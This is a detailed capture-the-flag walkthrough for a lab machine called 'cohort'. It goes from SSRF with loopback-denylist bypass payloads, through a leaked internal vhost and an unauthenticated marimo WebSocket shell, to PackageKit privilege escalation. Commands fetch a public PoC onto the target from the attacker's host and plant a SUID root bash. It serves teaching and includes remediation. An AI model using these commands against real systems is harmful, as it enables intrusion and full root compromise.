# cohort — Hands-On Walkthrough (the *decision tree*, not the happy path)

> **Box:** cohort · easy · Linux (Ubuntu 24.04, kernel 6.8.0-136)
> **IP used here:** `10.129.244.174` (yours will differ on respawn — substitute it everywhere)
> **Final chain:** `SSRF → internal-vhost leak → marimo pre-auth RCE (CVE-2026-39987) → user → PackageKit TOCTOU LPE (CVE-2026-41651) → root`
>
> This document is deliberately written as *"at this point you have these options; I tried X, Y, Z; X and Y died for these reasons; Z was the way."* Follow it slowly — the dead-ends are the lesson. The clean/straight version lives in `REPORT.md`.
>
> **How to read this doc:** after every command there is a **✅ Expected** block showing roughly what you should see. If your output *doesn't* match it, **stop and fix that before moving on** — don't push forward hoping it sorts itself out. Most mismatches trace back to the three recurring gotchas below.

### ⚠️ Three gotchas that cause 90% of "it's not working" (re-read when stuck)
1. **Use YOUR current tun0 IP, never a copy-pasted one.** The box respawns and your VPN IP can change between sessions. Anywhere this doc says `10.10.15.6`, substitute what `ip -br a | grep tun` shows *right now*.
2. **Start your listener BEFORE you fire the request that calls back to it.** An SSRF/reverse callback to a port with nothing listening just returns empty — that is NOT a "the vuln doesn't work," it's "nobody was home." (This is the #1 thing that looks like failure but isn't.)
3. **Exactly ONE VPN tunnel.** If `ip -br a | grep tun` shows `tun0` *and* `tun1` both on your IP, return traffic is split and everything reads as flaky/empty. Kill all openvpn, bring up one. (See Phase 0.)

---

## Phase 0 — Setup gotchas (learn these first, they waste hours otherwise)

Before any recon, two environment traps worth internalizing:

1. **HTB blocks ICMP.** A failing `ping` proves *nothing*. Always test reachability with a **TCP connect**, not ping:
   ```bash
   for p in 22 80 443; do (echo > /dev/tcp/10.129.244.174/$p) 2>/dev/null && echo "$p open"; done
   ```
   > **✅ Expected:**
   > ```
   > 22 open
   > 80 open
   > 443 open
   > ```
   > If you get *nothing* for all three, don't assume the box is down — check gotcha #3 (dup tunnel) first.
2. **Duplicate VPN tunnels cause phantom "box is down".** If you ever reconnect the VPN without killing the old process, you get **two `tun` devices with the same IP** and return traffic lands on the wrong one — connections become flaky/0%:
   ```bash
   pgrep -a -f openvpn          # should be ONE instance group
   ip -br a | grep tun          # should be ONE tun with your 10.10.x.x
   ```
   > **✅ Expected:** exactly one `tun0` line with your `10.10.x.x` address. If you see `tun0` **and** `tun1` (both your IP), that's the trap — fix it:
   > ```bash
   > sudo pkill -9 -f openvpn         # kill everything
   > pgrep -a -f openvpn              # -> nothing
   > ip -br a | grep tun              # -> nothing (tunl0 DOWN is fine, that's not a VPN)
   > sudo openvpn machines_eu-2.ovpn  # bring up exactly ONE
   > ip -br a | grep tun              # -> ONE tun0 @ 10.10.x.x  <- note this IP, you'll reuse it
   > ```
   If you see `tun0` *and* `tun1` both holding your VPN IP, kill the stale openvpn group and keep one. (This bit us here — 0/10 connects until the dupe was killed.)

> **Teaching point:** when a box reads as uniformly unreachable, suspect *your side* before concluding the box isn't spawned.

---

## Phase 1 — Recon: map the surface, then resist the urge to brute everything

```bash
mkdir -p nmap web fuzz loot      # <- do this FIRST, or `-oN nmap/...` errors "No such file or directory"
# full TCP sweep first, then service/script scan on what's open
nmap -p- --min-rate 2000 -oN nmap/full-tcp.txt 10.129.244.174
nmap -sC -sV -p 22,80,443 -oN nmap/services.txt 10.129.244.174
```
> **✅ Expected:** three open ports and nothing else —
> ```
> 22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu
> 80/tcp  open  http     nginx 1.24.0 (Ubuntu)
> 443/tcp open  ssl/http nginx 1.24.0 (Ubuntu)
> ```
> plus, in the `-sC -sV` output, the 443 cert line `Subject: commonName=cohort.htb` with `Subject Alternative Name: DNS:cohort.htb, DNS:*.cohort.htb`.
> ⚠️ Pass the ports as `-p 22,80,443` (with `-p`!). Writing them bare (`... services.txt 22,80,443 10.129.244.174`) makes nmap treat them as a hostname → `Failed to resolve "22,80,443"`.

**Result:** only **22 (OpenSSH 9.6p1)**, **80 / 443 (nginx 1.24.0)**. 443 cert CN=`cohort.htb`, SAN `*.cohort.htb`.

```bash
echo "10.129.244.174 cohort.htb" | sudo tee -a /etc/hosts
```
> **✅ Expected:** the line echoes back, and `curl -sk https://cohort.htb/ | wc -c` now returns bytes (not a DNS error). If a browser says `ERR_NAME_NOT_RESOLVED`, that's the *in-app/preview* browser (it ignores `/etc/hosts`) — use a real Firefox/Chromium, or just use `curl` from the terminal.

### At this junction you have these options:
| Option | Verdict | Why |
|---|---|---|
| **A. SSH (22)** | parked | No creds yet, no username. Never blind-brute on HTB. Come back only if recon leaks a user+password. |
| **B. Web (80/443)** | **pursue** | The whole attack surface. 80 just 301s → `https://cohort.htb/`. |

So it's the web app. Browse it: it's a **client-side SPA ("Cohort Analytics")** — a tiny `index.html` shell + a big **obfuscated/encrypted `app.js`**. No visible forms, no obvious routes.

### Now the *second* junction — how do you enumerate a SPA? Four tempting options, three are traps:

1. **Directory fuzzing (`ffuf`/`gobuster` on `/FUZZ`)** → ❌ **DEAD.**
   nginx has a **catch-all**: *any* unmatched path returns the SPA shell with **HTTP 200, Content-Length 908**. So status-code matching finds "everything" = finds nothing.
   *Lesson:* baseline first. `curl -sk https://cohort.htb/doesnotexist | wc -c` → 908. If a bogus path 200s, dir-fuzzing by status is useless — you'd have to filter by size/behaviour, and even then it's noise.

2. **Vhost fuzzing (Host header, because of the `*.cohort.htb` SAN)** → ❌ **DEAD (at this stage).**
   nginx **301-redirects any unknown Host** back to canonical `https://cohort.htb/`. Even a deliberately bogus subdomain redirects. So the wildcard SAN is *bait* — it does NOT mean fuzzable live vhosts.
   *Lesson:* confirm with a bogus baseline (`-H "Host: zzzz.cohort.htb"`) before trusting any vhost "hit". (Keep this in mind — the real vhost shows up later, but **not** via wordlist guessing.)

3. **Statically deobfuscating `app.js`** → ❌ **DEAD.**
   It's `obfuscator.io`-style (string-array rotation) and later turns out to be AES-GCM-encrypted. `grep` for `/api`, `fetch`, `login` → 0 hits. Running it in a Node `vm` sandbox → it no-ops without a real browser DOM.
   *Lesson:* don't rathole on static JS. If you must, use a **real browser + Burp** and watch the actual XHR/fetch. (We instead found the API by probing the server directly — below.)

4. **Probe the backend API directly** → ✅ **THE WAY.**
   `curl` the one path that behaves differently from the 908 shell:
   ```bash
   curl -sk https://cohort.htb/api/           # -> 405 {"ok":false,"message":"Method not allowed."}
   curl -sk -X OPTIONS https://cohort.htb/api/ -i   # -> 501 with Python http.server default error page
   ```
   > **✅ Expected:** `/api/` returns `{"ok": false, "message": "Method not allowed."}`, and OPTIONS returns an HTTP/1.1 **501** whose body is the classic `<title>Error response</title> ... Error code: 501` page. That HTML (not a Flask/Django style error) is what fingerprints a **raw Python `http.server`** behind nginx.

   That 501 page fingerprints the backend as a **raw Python `http.server`** behind nginx. And:
   ```bash
   curl -sk https://cohort.htb/api/v1/health   # {"ok":true,"service":"cohort-insights"}
   curl -sk https://cohort.htb/api/v2/health   # same -> parallel v1/v2 surfaces
   ```
   > **✅ Expected:** both return `{"ok": true, "service": "cohort-insights"}` — confirms the backend name and that **v1 and v2 both exist**.

### Third junction — how do you enumerate *this* API? Method matters:
- **GET fuzzing** `/api/v1/FUZZ` → ❌ DEAD: every non-whitelisted GET returns a uniform **405**. Can't discriminate.
- **POST fuzzing** `/api/v1/FUZZ` → ✅ the discriminator: an **unregistered** route cleanly **404**s, so *anything that is NOT 404 on POST is a real route.*
   ```bash
   # ffuf with POST; match everything that is NOT 404
   ffuf -u https://cohort.htb/api/v1/FUZZ -X POST -H "Content-Type: application/json" \
        -d '{}' -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt \
        -fc 404 -k -t 10
   ```
   > Note the backend is concurrency-throttled — keep `-t` low (~10) or it crawls. A curated auth/billing/analytics wordlist found nothing; the win came from the raft list surfacing **`/api/{v1,v2}/validate`**.
   > **✅ Expected:** amid a wall of filtered 404s, exactly one hit —
   > ```
   > validate   [Status: 200, Size: 59, ...]
   > ```
   > The full run takes ~7–8 min at `-t 10` (that's normal, it's throttled). It's the binary `ffuf`, not `fuf` (easy typo). You can Ctrl-C once `validate` appears — it's the only route you need.

**Registered routes found:** `GET /health`, and the prize: **`POST /api/{v1,v2}/validate`**.

---

## Phase 2 — `/validate`: reason about what a feature *is* before you attack it

Probe its shape:
```bash
curl -sk -X POST https://cohort.htb/api/v1/validate -H 'Content-Type: application/json' -d '{}'
# {"ok":false,"message":"Enter a source URL to validate."}
curl -sk -X POST https://cohort.htb/api/v1/validate -H 'Content-Type: application/json' -d '{"url":"not-a-url"}'
# {"ok":false,"message":"Only http and https sources are supported."}
```
> **✅ Expected:** exactly those two JSON messages. If `{}` comes back **empty/blank** instead of `"Enter a source URL to validate."`, that is NOT the endpoint being weird — it's gotcha #3 (dup tunnel) dropping your return traffic. Fix the tunnel (Phase 0) and re-run; it should then give the message every time.

### Junction — what kind of bug does "take a URL, validate the scheme, fetch it" smell like?
An endpoint that takes an **attacker-supplied URL** and the server **fetches it** = textbook **SSRF**. That's your hypothesis. Confirm it (non-blind) by pointing it at *your* listener.

> 🔴 **READ THIS — the step that most people get "empty results" on.** This is a **two-terminal** move, and **order matters**. The backend tries to connect back to *you*; if nothing is listening on that port, the connection is refused and the curl returns **blank** — which looks like failure but just means nobody was home. You MUST start the listener first.

**Step A — in Terminal 1, start a listener and LEAVE IT RUNNING:**
```bash
nc -lvnp 9000            # or: python3 -m http.server 9000
```
**Step B — find your current tun0 IP (do NOT trust 10.10.15.6 blindly):**
```bash
ip -br a | grep tun      # e.g. tun0  UNKNOWN  10.10.14.22/23  -> your IP is 10.10.14.22
```
**Step C — in Terminal 2, fire the SSRF at `http://<YOUR-tun0-IP>:9000/callback`:**
```bash
curl -sk -X POST https://cohort.htb/api/v1/validate -H 'Content-Type: application/json' \
     -d '{"url":"http://10.10.14.22:9000/callback"}'    # <-- replace with YOUR IP from Step B
```
> **✅ Expected — TWO things happen at once:**
> 1. **Terminal 1 (listener)** shows an inbound connection, e.g.
>    ```
>    connect to [10.10.14.22] from (UNKNOWN) [10.129.244.174] ...
>    GET /callback HTTP/1.1
>    User-Agent: CohortInsights/1.0
>    ```
> 2. **Terminal 2 (curl)** returns JSON echoing what the server fetched, with keys `fetched_status`, `content_type`, **`preview`**.
>
> Seeing the callback hit Terminal 1 = **non-blind SSRF confirmed.** (It's a Python `urllib.request` GET fetcher.)
> **If you see nothing:** (a) listener wasn't running first → restart from Step A; (b) wrong IP → recheck Step B; (c) blank even with both right → dup tunnel (Phase 0).

### Junction — SSRF to *what*? Enumerate the options and kill them one by one:
1. **Loopback is denied** — literal `127.0.0.1` / `localhost` / `::1` → *"Internal or loopback addresses are not permitted."*
   **Bypass the denylist** (classic): `127.1`, `0.0.0.0`, decimal `2130706433`, octal `0177.0.0.1`, `127.0.0.2`, `[::ffff:127.0.0.1]` — all reach internal services. ✅
   ```bash
   curl -sk -X POST https://cohort.htb/api/v1/validate -H 'Content-Type: application/json' \
        -d '{"url":"http://127.1/"}'       # internal :80 returns the app (200), not the external 301
   ```
   > **✅ Expected:** JSON with `fetched_status: 200` and a `preview` of the **internal** app HTML. Contrast: a literal `127.0.0.1` returns `"Internal or loopback addresses are not permitted."` (denylist), and the *external* `:80` only 301-redirects — so a 200 here proves the bypass reached the loopback service. (No listener needed for these — you're reading the server's own JSON response, not a callback.)
2. **Map internal ports via SSRF** (walk the loopback): you find
   - `:80` SPA, `:5000` `cohort-insights` (the SSRF app itself), **`:8888` marimo 0.20.4**.
3. **Dead-ends you *will* be tempted by — skip them, they're genuinely impossible with this primitive:**
   - SSRF → **WebSocket** / raw TCP → ❌ a `urllib` **GET** fetcher cannot speak WS or raw TCP. Architecturally impossible. (Don't burn hours here — I did, so you don't have to.)
   - `file://` / `gopher://` / `dict://` (primary **or** via redirect) → ❌ scheme check is strict.
   - Header injection / CRLF / `userinfo→Basic-auth` / POST body → ❌ all blocked/unsettable.

### The breakthrough move at this phase:
marimo on `:8888` is the real RCE target (below), but its WebSocket isn't exposed on the default vhost. **How do you find where nginx *does* proxy it?** Ask nginx itself, through the SSRF:
```bash
curl -sk -X POST https://cohort.htb/api/v1/validate -H 'Content-Type: application/json' \
     -d '{"url":"http://127.1/status"}'
```
The `/status` page (loopback-only; `deny all` externally) **leaks the nginx upstream map**, including:
```
upstream "notebooks" host = nb-1be3782a8afd3ad5.cohort.htb -> 127.0.0.1:8888
```
> **✅ Expected:** the `preview` in the JSON contains the nginx status/upstream text including a `nb-<hash>.cohort.htb -> 127.0.0.1:8888` line. **Copy that exact hostname** — it's unique to this box instance. (If `/status` externally gives 403, that's correct — it's `deny all`; you reach it only *through* the SSRF loopback bypass, i.e. `http://127.1/status`.)

*That* is the real internal vhost — a random hash subdomain you could **never** have guessed with a wordlist (which is why Phase-1 vhost fuzzing was correctly a dead-end, not a skill issue).

```bash
# repoint hosts to the leaked vhost
echo "10.129.244.174 cohort.htb nb-1be3782a8afd3ad5.cohort.htb" | sudo tee /etc/hosts
curl -sk https://nb-1be3782a8afd3ad5.cohort.htb/api/version    # -> 0.20.4
```
> **✅ Expected:** `/api/version` returns `0.20.4` (the vulnerable marimo). If it instead 301-redirects to `cohort.htb`, your `/etc/hosts` line for the `nb-<hash>` vhost is missing/misspelled — re-add it. Use the hostname you copied above, not the one printed here (yours may differ on respawn).

---

## Phase 3 — marimo 0.20.4 → foothold (user.txt)

### Junction — marimo 0.20.4 has more than one known bug. Options:
| Option | Outcome |
|---|---|
| **A. CVE-2026-39987** — unauth bidirectional WebSocket `/terminal/ws` spawns a PTY (edit-mode) with **no auth** | ✅ **this is the foothold** |
| B. config-injection RCE (PEP723 `mcp` section) | viable alt, more fragile; unnecessary once A works |
| C. marimo auth/token endpoints | ❌ dead — `/terminal/ws` is *pre-auth*, token is irrelevant |

**Why this works now and "didn't" before:** the earlier dead-end was a **wrong-method** conclusion — the WS upgrade was only ever tested on the *default* vhost `cohort.htb` (where nginx proxies no WS). nginx proxies the marimo WebSocket **only on the named `nb-…` vhost** you just leaked. Same box, right door.

Drive it with a tiny `websockets` client (raw-byte PTY: send `cmd\n`, read terminal bytes). See `ws_exec.py`:
```bash
python3 ws_exec.py 'id' 'cat /home/marimo/user.txt'
# uid=1000(marimo) ...
# user.txt -> <flag>
```
> ⚠️ **The marimo vhost changes on every respawn — update `target.json`, not the script.** `ws_exec.py` connects to `wss://nb-<hash>.cohort.htb/terminal/ws`, and that `nb-<hash>` is unique per box instance. The script reads the hash from **`target.json`** (sitting next to it), so you never edit code — just paste the new hash. If the script hangs or errors on connect, your hash is stale.
>
> **Step 1 — re-leak the current vhost via the Phase-2 SSRF:**
> ```bash
> curl -sk -X POST https://cohort.htb/api/v1/validate -H 'Content-Type: application/json' \
>      -d '{"url":"http://127.1/status"}'      # -> upstream "notebooks" host = nb-<hash>.cohort.htb
> ```
> **Step 2 — paste it into `target.json`** (full `nb-<hash>.cohort.htb` or just the `<hash>` — both accepted):
> ```json
> { "hash": "1be3782a8afd3ad5", "base_domain": "cohort.htb" }
> ```
> That's it — `python3 ws_exec.py 'id'` now targets the new instance. (One-off override without touching the file: `VH=nb-<hash>.cohort.htb python3 ws_exec.py 'id'`.)
> **✅ Expected:** `id` prints `uid=1000(marimo) gid=1000(marimo)` and the second command prints a 32-hex-char flag → **user.txt captured.** If the script errors on connect, confirm `/api/version` still says `0.20.4` and that you're hitting the `nb-<hash>` vhost (the WS is proxied *only* there, never on `cohort.htb`). The flag value rotates on respawn — don't compare it to any value written in this doc.

> **Teaching point:** `marimo`'s login shell is disabled (`This account is currently not available`), so planting an SSH key is **inert** — the WS PTY *is* your shell. Don't waste time on SSH persistence here.

---

## Phase 4 — Privilege escalation: marimo → root

**Work a checklist, not a hunch.** Here's the full tier walk (the `linux-privesc` method): at each step, *what you check* and *what it returned on this box*. The point is that **most of these are dead-ends** — and knowing they're dead is what points you at the real one.

```bash
# run each via the PTY, e.g.:  python3 ws_exec.py '<cmd>'
```

| # | Check | Command | Result on cohort | Verdict |
|---|---|---|---|---|
| 1 | **sudo** | `sudo -n -l` | *a password is required* (we have none) | ❌ blocked |
| 2 | **SUID** | `find / -perm -4000 -type f 2>/dev/null` | only distro-standard (`su`, `mount`, `pkexec`-helpers…); **no GTFOBins win, no SUID `pkexec`** | ❌ n/a |
| 3 | **Capabilities** | `getcap -r / 2>/dev/null` | `ping`/`mtr`/`snap-confine`/`gst` — all standard; **no `cap_setuid` interpreter** (so no Cap-style setuid(0)) | ❌ n/a |
| 4 | **Cron** | `cat /etc/crontab; ls -la /etc/cron.*` | crontab + `cron.hourly` empty; apt timers hours away | ❌ n/a |
| 4b | **Hidden root jobs** | 50-second poor-man's pspy (diff root PIDs over time) | **no recurring root process** | ❌ n/a |
| 5 | **Writable sensitive** | `ls -l /etc/passwd /etc/shadow` | `passwd` 644 root (not writable) | ❌ blocked |
| 6 | **Stored secrets** | read `/opt/cohort-insights/insights_api.py`, `~/.bash_history`, `~/.ssh` | API source has **no creds**; history → `/dev/null`; no keys | ❌ n/a |
| 7 | **Listeners** | `ss -tlnp` | `:5000` insights, `:8888` marimo — already known | ❌ n/a |
| 8 | **Groups** | `id` | `marimo` only — no `docker`/`lxd`/`disk`/`sudo` | ❌ n/a |
| T2 | **/opt custom apps** | `ls -la /opt` | `insights` (nologin), `marimo` venv, **`sysmonforlinux` + `sysinternalsEBPF`** (eBPF monitoring — note: your actions are being logged, but it's not a privesc vector) | — |

### So everything "normal" is dead. Now the junction the box is actually steering you to — **package/version enumeration:**
```bash
python3 ws_exec.py "dpkg -l | grep -iE 'packagekit|polkit|needrestart|snapd|sysmon'"
```
> **✅ Expected:** you can read off the installed versions — notably **`packagekit  1.2.8`**, `needrestart 3.6`, `polkitd 124`, `snapd`. The two with known CVEs are packagekit and needrestart (next table).
Two interesting system-management utilities with known CVEs:

| Candidate | Version | CVE | Usable here? |
|---|---|---|---|
| **needrestart** | 3.6 | CVE-2024-48990 (PYTHONPATH LPE) | ❌ **parked** — the exploit needs root to *run* `needrestart` (via an apt/dpkg action), and there's **no root trigger** on this box (Phase-4 #4/#4b proved it). Technically vulnerable, practically a dead-end here. |
| **PackageKit** | **1.2.8** | **CVE-2026-41651 "Pack2TheRoot"** | ✅ **THE ROOT** — `packagekitd` runs **as root** and the bug needs no trigger from us. |

> **Teaching point on *why* needrestart is a trap:** vulnerable ≠ exploitable. Always ask "what has to happen for this to fire, and can I make it happen?" For needrestart the answer was "root must install a package," and nothing on the box does that on a timer. That single question saves you from a long rathole.

### CVE-2026-41651 — confirm, then exploit (small verified steps)

**Why it works (one paragraph):** `packagekitd` (root) has a TOCTOU in `InstallFiles()`. Send two async D-Bus calls on the *same* transaction: the first with the **`SIMULATE` (0x4)** flag (which skips the polkit auth check), the second with **no flags** — the second overwrites the cached flags/path with no state check, so when the transaction actually dispatches it runs the **real** (non-simulated) install of your `.deb` as root. The `.deb`'s `postinst` runs as root → drop a SUID bash. (It's deterministic thanks to GLib main-loop priority ordering, not a flaky timing race.)

> **Placeholders used in every command below — substitute your own values:**
> - `ws_exec.py` = the WS PTY driver script (shown below). Run these commands **from the folder where you saved it** (so `python3 ws_exec.py ...` resolves); they execute **on the target** via the marimo WebSocket.
> - `<WORKDIR>` = whatever directory *you* work in on your Kali (your own `.../cohort/...`). The "your Kali" commands run from there.
> - `<TUN_IP>` = your current VPN IP, from `ip -br a | grep tun` (do **not** copy `10.10.15.6`).
>
> Reminder: each `ws_exec.py` call is a **fresh shell** — `cd`/`&` don't persist, so chain with `;` and use absolute paths.

**Step P1 — pre-flight: confirm the target has the Python D-Bus deps the PoC needs:**
```bash
python3 ws_exec.py "python3 -c 'import dbus, dbus.mainloop.glib; from gi.repository import GLib; print(\"deps-ok\")'"
```
> **✅ Expected:** prints `deps-ok`. (cohort ships `python3-dbus` 1.3.2 + `python3-gi` natively.) If it errors on import, the PoC can't run — but on this box it won't.

**Step P2 — get the PoC onto the target.** You can't run the exploit on the box until the script is *on* the box. The target has no internet, so the flow is: download the PoC to **your Kali** → serve it over HTTP from **your Kali** → `wget` it from **the target**.

**P2.1 — ON YOUR KALI (normal terminal): fetch the public PoC and save it as `pk.py` in `<WORKDIR>`.**
```bash
cd <WORKDIR>
curl -sL https://raw.githubusercontent.com/mawussid/CVE-2026-41651-Python/main/cve-2026-41651.py -o pk.py
ls -l pk.py        # must exist and be non-empty before you go on
```
> If that URL 404s: `git clone https://github.com/mawussid/CVE-2026-41651-Python` then `cp CVE-2026-41651-Python/*.py pk.py`. Either way, the goal is simply: **a file called `pk.py` sitting in `<WORKDIR>`.**

**P2.2 — ON YOUR KALI (same terminal, leave it RUNNING): serve `<WORKDIR>` over HTTP.**
```bash
# run this FROM <WORKDIR>, the same folder where pk.py now is:
python3 -m http.server 9001 --bind <TUN_IP>
```
> This terminal blocks and waits — that's correct, leave it open. (`http.server` serves whatever folder you launched it from, so `pk.py` is now reachable at `http://<TUN_IP>:9001/pk.py`.)
>
> ⚠️ **If you get `OSError: [Errno 98] Address already in use`** — a leftover server from an earlier run is still holding the port. Find it and kill it, then re-run P2.2:
> ```bash
> ss -tlnp | grep ':9001'                 # shows the PID holding it, e.g. pid=261260
> sudo kill -9 <PID>                        # kill that PID (or: sudo pkill -9 -f 'http.server 9001')
> ss -tlnp | grep ':9001' || echo FREE      # 'FREE' = port is clear, start the server again
> ```
> Or just pick a different port (e.g. `9002`) — but then use that **same** port in the P2.3 `wget` URL.

**P2.3 — ON THE TARGET (via the PTY, in a *different* terminal): pull the file into `/dev/shm`.**
```bash
python3 ws_exec.py 'cd /dev/shm && wget -q http://<TUN_IP>:9001/pk.py -O pk.py && ls -l /dev/shm/pk.py'
```
> **✅ Expected — two things, one on each Kali terminal:**
> 1. **P2.2's terminal** prints a hit like `<TARGET_IP> - - [..] "GET /pk.py HTTP/1.1" 200 -`.
> 2. **P2.3's call** returns an `ls -l` line showing `/dev/shm/pk.py` with a non-zero size.
>
> **If no GET appears in P2.2's terminal:** the file didn't transfer. Usual causes — wrong `<TUN_IP>`, the http.server wasn't started first, or `pk.py` wasn't in the folder you launched the server from.

**Step P3 — confirm the box is actually vulnerable (non-destructive check):**
```bash
python3 ws_exec.py 'python3 /dev/shm/pk.py --check'
```
> **✅ Expected:** a line confirming **PackageKit 1.2.8 is in the vulnerable range** (e.g. `VULNERABLE`). If it says not-vulnerable, stop — the version differs from what this walkthrough assumes.

**Step P4 — run the exploit detached + logged** (the PoC polls up to ~120s; running it detached means a flaky PTY won't cut it off mid-race). Because `&` doesn't survive a single `ws_exec` call, launch it with `setsid` so it keeps running after the call returns:
```bash
python3 ws_exec.py 'cd /dev/shm && setsid bash -c "python3 /dev/shm/pk.py --exec \"id\" > /dev/shm/pk.log 2>&1" & echo launched'
```
Then **poll the log in a separate call** (repeat every ~20s until it finishes):
```bash
python3 ws_exec.py 'cat /dev/shm/pk.log; echo ===; ls -l /tmp/.suid_bash 2>/dev/null'
```
> **✅ Expected pattern in the log:**
> - You *will* see `PK error 48: Failed to obtain authentication` on the SIMULATE call — **this is NORMAL, not a failure.** It's the expected byproduct of the auth-skip call; the race still wins.
> - Watch for the success line, roughly `SUCCESS: SUID bash at /tmp/.suid_bash`, and the `ls -l` showing `/tmp/.suid_bash` as `-rwsr-xr-x root root` (the `s` = setuid-root).
> - If after ~120s there's no `.suid_bash`, re-run P4 once (the dispatch occasionally needs a second attempt); it's deterministic on retry.

**Step P5 — use the SUID bash to become root and read the flag:**
```bash
python3 ws_exec.py '/tmp/.suid_bash -p -c "id"'
```
> **✅ Expected:** `uid=1000(marimo) gid=1000(marimo) euid=0(root)` — the `euid=0(root)` is proof you're root. Now read the flag:
```bash
python3 ws_exec.py '/tmp/.suid_bash -p -c "cat /root/root.txt"'
```
> **✅ Expected:** a 32-hex-char string → **root.txt captured.** (Value rotates on respawn; don't compare to this doc.)

🚩 **root.txt** captured. Box owned.

---

## The whole thing on one page (the map you were building)

```
22/80/443
   └─ 443 SPA  ──(dir-fuzz ✗ · vhost-fuzz ✗ · static-JS ✗)
        └─ POST-fuzz /api  ──► /api/{v1,v2}/validate
             └─ SSRF (loopback denylist bypass: 127.1, 2130706433, 0177.0.0.1, …)
                  ├─ SSRF→WS ✗  file/gopher ✗  headers/CRLF ✗   (all impossible w/ urllib GET)
                  └─ SSRF GET /status  ──► leaks vhost nb-1be3782a8afd3ad5.cohort.htb → :8888
                        └─ marimo 0.20.4  ──► CVE-2026-39987 unauth WS /terminal/ws PTY
                              └─ USER (marimo, uid 1000)
                                   └─ privesc tiers: sudo✗ SUID✗ caps✗ cron✗ secrets✗ groups✗
                                        └─ pkg enum: needrestart 3.6 (no trigger ✗)
                                                     PackageKit 1.2.8  ──► CVE-2026-41651 TOCTOU
                                                           └─ ROOT
```

## Remediation (for the report side)
- **marimo:** upgrade past the `/terminal/ws` pre-auth RCE; don't expose the notebook server (even internally) without auth; the `/status` upstream leak should not be reachable even from loopback by an app that proxies attacker-controlled fetches.
- **SSRF:** validate by *resolved IP* against a denylist of all internal/loopback ranges (block `127.0.0.0/8`, link-local, RFC1918, `::1`, IPv4-mapped v6), not by string-matching hostnames.
- **PackageKit:** upgrade to **≥ 1.3.5**, and/or enforce an explicit polkit rule requiring admin auth for all `org.freedesktop.packagekit.*` actions.

## Cleanup (artifacts this walkthrough leaves on the box)
`/tmp/.suid_bash` (SUID root), `/dev/shm/pk.py`, `/tmp/.pk-*.deb` — remove them when you're done:
```bash
/tmp/.suid_bash -p -c 'rm -f /tmp/.suid_bash /dev/shm/pk.py /tmp/.pk-*.deb'
```
